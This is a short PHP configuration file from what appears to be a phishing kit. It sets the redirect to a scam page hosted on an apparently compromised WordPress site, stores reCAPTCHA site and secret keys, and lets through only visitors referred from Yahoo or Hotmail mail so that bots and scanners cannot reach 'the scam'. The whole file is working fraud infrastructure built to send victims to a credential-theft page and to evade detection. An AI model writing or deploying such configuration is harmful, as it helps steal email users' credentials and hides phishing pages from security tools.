<?php
// --> #SCAMA Redirect Dont use any ather Redirect =D    ###
$scamaurl = 'golfforvets.org/wp-admin/images/Mego/Home'; // Put Here your ScamPage URL Fucking BRO

$captcha_site_key = "6Lfzm-QUAAAAABTjDD8YFkqWHyxxLTNbVeqBHZYA";

$captcha_secret_key = "6Lfzm-QUAAAAAJL3eDdUxvsmDFxHvL3fo--cNj1T";

$allowed_referers =array("yahoo","hotmail","other");
// you can allow vistors only which come fom hotmail or yahoo only 
// to fuck any bot want to access athe scam and you can add more easy 
$show_captchaa = "no";
?>